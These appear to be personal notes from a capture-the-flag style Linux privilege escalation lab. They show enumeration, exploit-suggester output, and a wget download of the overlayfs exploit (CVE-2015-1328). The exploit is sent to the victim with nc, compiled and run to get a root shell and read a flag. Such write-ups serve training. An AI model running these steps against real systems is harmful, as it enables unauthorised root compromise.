# LINUX PRIVILEGE ESCALATION 
> TASK 3 ENUMERATION 

me=10.10.84.129
target=10.10.35.144 
target=10.10.115.127


karen
Password1

sudo nmap -sSVC -T4 --min-rate 8888 10.10.35.144

ssh
create nc listener
victim rev shell 
stabilize shell

karen@wade7363:/tmp$ cat /proc/version
Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014
````
clone linux exploit suggester
send to victim pc 
```
./les.sh > exploits.txt           
karen@wade7363:/tmp$ cat exploits.txt | grep "high" -B3 -A3
[+] [CVE-2016-5195] dirtycow

Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
Exposure: highly probable
Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
Download URL: https://www.exploit-db.com/download/40611
Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
--
[+] [CVE-2016-5195] dirtycow 2

Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
Exposure: highly probable
Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
Download URL: https://www.exploit-db.com/download/40839
ext-url: https://www.exploit-db.com/download/40847
--
[+] [CVE-2015-1328] overlayfs

Details: http://seclists.org/oss-sec/2015/q2/717
Exposure: highly probable
Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
Download URL: https://www.exploit-db.com/download/37292

wget https://www.exploit-db.com/download/37292
mv 37292 exploit.c
nc TARGET_IP 3333 < exploit.c

gcc exploit.c -o exploit
./exploit

karen@wade7363:/tmp$ ./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
# bash
root@wade7363:/tmp# find / -name flag1.txt 2>/dev/null
/home/matt/flag1.txt
root@wade7363:/tmp# cat /home/matt/flag1.txt
THM-28392872729920


```
